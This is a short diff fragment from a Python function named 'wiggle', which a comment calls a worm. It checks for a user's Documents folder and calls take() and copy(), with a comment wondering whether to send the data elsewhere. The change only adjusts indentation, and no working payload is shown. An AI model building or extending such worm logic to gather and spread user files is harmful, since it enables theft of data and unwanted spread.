@@ -64,8 +64,9 @@ def wiggle():
             copy()
            
             #should I send it to another location
+
         #if the worm is in Documents
-         if(os.path.isdir("/home/"+username+"/Documents/")):
+        if(os.path.isdir("/home/"+username+"/Documents/")):
             take()
             copy()
            
